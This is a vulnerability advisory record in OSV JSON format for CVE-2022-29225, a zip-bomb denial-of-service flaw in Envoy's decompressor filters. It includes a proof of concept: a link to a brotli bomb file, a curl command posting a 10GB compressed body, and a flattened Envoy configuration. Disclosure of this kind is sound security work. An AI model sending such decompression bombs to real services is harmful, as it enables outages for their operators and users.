{
  "modified": "2022-06-09T16:12:22Z",
  "published": "2022-06-09T16:12:22Z",
  "schema_version": "1.5.0",
  "id": "CVE-2022-29225",
  "aliases": [
    "GHSA-75hv-2jjj-89hh"
  ],
  "details": "# Attack type\r\nRemote, dataplane\r\n\r\n# Impact\r\nDenial of Service\r\n\r\n# Affected component(s)\r\nAll decompressor filters\r\n\r\n# Attack vector(s)\r\nA specifically constructed HTTP body delivered by an untrusted downstream or upstream peer whose decompressed size is dramatically larger than the compressed size..\r\n\r\n# Discoverer(s)/Credits\r\nShachar Menashe\u003cshacharm@jfrog.com\u003e\r\n\r\n# Description (brief; included in CVE)\r\nDecompressors accumulate decompressed data into an intermediate buffer before overwriting the body in the decode/encodeBody. This may allow an attacker to zip bomb the decompressor by sending a small highly compressed payload.\r\n\r\n# Example exploit or proof-of-concept\r\n\r\nExample bomb: https://raw.githubusercontent.com/bones-codes/bombs/master/http/br.zip.bz2\r\n\r\n```\r\nrepro command 'curl -v http://10.0.0.1:10000/ -H \"Content-Encoding: br\" -H \"Expect:\" --data-binary @/mnt/c/temp/10GB.html.br`\r\nconfig:\r\nstatic_resources: \r\nlisteners: \r\n- address: \r\nsocket_address: \r\naddress: 0.0.0.0 \r\nport_value: 10000 \r\nfilter_chains: \r\n- filters: \r\n- name: envoy.filters.network.http_connection_manager \r\ntyped_config: \r\n\"@type\": \r\ntype.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnection Manager \r\npath_with_escaped_slashes_action: UNESCAPE_AND_FORWARD \r\nmerge_slashes: true \r\ncodec_type: AUTO \r\nstrip_trailing_host_dot: true \r\nstrip_any_host_port: true \r\nstat_prefix: ingress_http \r\nroute_config: \r\nname: local_route \r\nvirtual_hosts: \r\n- name: app \r\ndomains: \r\n- \"*\" \r\nroutes: \r\n- match: \r\nprefix: \"/\" \r\nroute: \r\ncluster: service-http \r\nhttp_filters: \r\n- name: decompressor \r\ntyped_config: \r\n\"@type\": \r\ntype.googleapis.com/envoy.extensions.filters.http.decompressor.v3.Decompressor decompressor_library: \r\nname: basic \r\ntyped_config: \r\n\"@type\": \r\ntype.googleapis.com/envoy.extensions.compression.brotli.decompressor.v3.Brotli - name: envoy.filters.http.router \r\nclusters:\r\n- name: service-http \r\ntype: STRICT_DNS \r\nlb_policy: ROUND_ROBIN \r\nload_assignment: \r\ncluster_name: service-http \r\nendpoints: \r\n- lb_endpoints: \r\n- endpoint: \r\naddress: \r\nsocket_address: \r\naddress: 127.0.0.1 \r\nport_value: 4567 \r\n- lb_endpoints: \r\n- endpoint: \r\naddress: \r\nsocket_address: \r\naddress: 127.0.0.1 \r\nport_value: 4568 \r\nDescription (full; not included in CVE but will be published on GitHub later and linked)\r\n```\r\n\r\n# Mitigation\r\nDisable decompression",
  "affected": [
    {
      "package": {
        "ecosystem": "DHI",
        "name": "envoy",
        "purl": "pkg:dhi/envoy"
      },
      "ranges": [
        {
          "type": "SEMVER",
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "1.22.1"
            }
          ]
        }
      ],
      "database_specific": {
        "source_ecosystem": "envoy",
        "source_package": "Envoy"
      }
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/envoyproxy/envoy/security/advisories/GHSA-75hv-2jjj-89hh"
    }
  ]
}